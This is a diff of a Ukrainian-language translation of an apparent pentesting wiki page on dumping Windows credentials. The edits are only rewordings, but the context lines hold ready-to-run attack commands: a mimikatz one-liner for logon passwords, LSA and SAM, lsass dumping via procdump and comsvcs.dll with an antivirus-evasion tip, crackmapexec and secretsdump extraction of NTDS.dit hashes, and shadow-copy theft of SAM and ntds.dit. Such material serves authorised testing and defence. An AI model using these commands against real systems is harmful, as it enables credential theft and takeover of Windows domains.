@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Знайдіть інші можливості, які має Mimikatz, на** [**цій сторінці**](credentials-mimikatz.md)**.**
+**Знайдіть інші можливості, які може виконувати Mimikatz, на** [**цій сторінці**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Облікові дані з Meterpreter
 
-Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати паролі та хеші** всередині жертви.
+Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **який** я створив, щоб **шукати паролі та хеші** всередині жертви.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -50,7 +50,7 @@ mimikatz_command -f "lsadump::sam"
 ### Procdump + Mimikatz
 
 Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, його не виявляє Defender.\
-Ви можете використовувати цей інструмент для **дампу процесу lsass**, **завантаження дампу** та **екстракції** **облікових даних локально** з дампу.
+Ви можете використовувати цей інструмент для **дампування процесу lsass**, **завантаження дампу** та **екстракції** **облікових даних локально** з дампу.
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -69,7 +69,7 @@ mimikatz # sekurlsa::logonPasswords
 
 **Примітка**: Деякі **AV** можуть **виявити** використання **procdump.exe для дампу lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" та "lsass.exe"**. Тому **більш непомітно** передати **PID** lsass.exe як **аргумент** для procdump **замість** **імені lsass.exe.**
 
-### Дамп lsass за допомогою **comsvcs.dll**
+### Дамп lsass з **comsvcs.dll**
 
 DLL з назвою **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі збою. Ця DLL містить **функцію** з назвою **`MiniDumpW`**, призначену для виклику за допомогою `rundll32.exe`.\
 Не має значення використовувати перші два аргументи, але третій поділений на три компоненти. Ідентифікатор процесу, який потрібно дампити, становить перший компонент, місце розташування файлу дампу представляє другий, а третій компонент - це строго слово **full**. Альтернативних варіантів не існує.\
@@ -91,7 +91,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 ### Витягування lsass за допомогою procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) - це підписаний Microsoft двійковий файл, який є частиною [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) набору.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) - це підписаний Microsoft двійковий файл, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
@@ -123,7 +123,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Витягніть історію паролів NTDS.dit з цільового DC
+### Витягти історію паролів NTDS.dit з цільового DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -152,7 +152,7 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 Ви можете виконати копію захищених файлів, використовуючи цю службу. Вам потрібно бути адміністратором.
 
-#### Використання vssadmin
+#### Using vssadmin
 
 Бінарний файл vssadmin доступний лише в версіях Windows Server.
 ```bash
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Але ви можете зробити те ж саме з **Powershell**. Це приклад **як скопіювати файл SAM** (жорсткий диск, що використовується, - "C:", і він зберігається в C:\users\Public), але ви можете використовувати це для копіювання будь-якого захищеного файлу:
+Але ви можете зробити те ж саме з **Powershell**. Це приклад **як скопіювати файл SAM** (використовується жорсткий диск "C:", і він зберігається в C:\users\Public), але ви можете використовувати це для копіювання будь-якого захищеного файлу:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -178,7 +178,7 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 ### Invoke-NinjaCopy
 
-Нарешті, ви також можете використовувати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) для створення копії SAM, SYSTEM та ntds.dit.
+Нарешті, ви також можете використовувати [**PS скрипт Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) для створення копії SAM, SYSTEM та ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
@@ -190,7 +190,7 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 
 - **Таблиця даних**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як користувачі та групи.
 - **Таблиця зв'язків**: Вона відстежує відносини, такі як членство в групах.
-- **Таблиця SD**: Тут зберігаються **дескриптори безпеки** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.
+- **Таблиця SD**: Тут зберігаються **безпекові дескриптори** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.
 
 Більше інформації про це: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
@@ -212,7 +212,7 @@ Windows використовує _Ntdsa.dll_ для взаємодії з цим
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Ви також можете використовувати трюк з [**копією тіней томів**](./#stealing-sam-and-system) для копіювання файлу **ntds.dit**. Пам'ятайте, що вам також знадобиться копія файлу **SYSTEM** (знову ж таки, [**вивантажте його з реєстру або використовуйте трюк з копією тіней томів**](./#stealing-sam-and-system)).
+Ви також можете використовувати трюк з [**копією тіньового тому**](./#stealing-sam-and-system) для копіювання файлу **ntds.dit**. Пам'ятайте, що вам також знадобиться копія файлу **SYSTEM** (знову ж таки, [**вивантажте його з реєстру або використовуйте трюк з копією тіньового тому**](./#stealing-sam-and-system)).
 
 ### **Витягування хешів з NTDS.dit**
 
@@ -220,7 +220,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Ви також можете **автоматично витягувати їх**, використовуючи дійсного користувача адміністратора домену:
+Ви також можете **автоматично витягувати їх**, використовуючи дійсного користувача з правами адміністратора домену:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
